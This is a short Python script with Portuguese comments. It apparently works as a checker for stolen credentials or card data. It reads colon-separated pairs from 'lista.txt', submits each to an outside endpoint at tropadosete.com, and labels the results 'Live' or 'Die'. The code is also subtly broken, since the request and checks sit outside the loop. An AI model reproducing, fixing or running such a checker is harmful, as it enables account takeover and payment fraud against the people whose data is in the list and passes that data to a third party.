#Lib de requisição
import requests

#Abrir lista
list = open('lista.txt', 'r').readlines()
list = [line.replace('\n', '') for line in list]

#Andar dentro da lista
for line in list:
    newline = line.split(':')
    payload = {"lista": newline[0]+":"+newline[1]}

#API adaptada
login = requests.get('https://tropadosete.com/v3/api.php',(payload))

if login.text == "#Aprovada "+newline[0]+":"+newline[1]:
	print('Live ==> {}|{}'.format(newline[0], newline[1])+'\n')
if login.text == "#Reprovada "+newline[0]+":"+newline[1]:
	print('Die ==> {}|{}'.format(newline[0], newline[1])+'\n')
else:
	print('erro')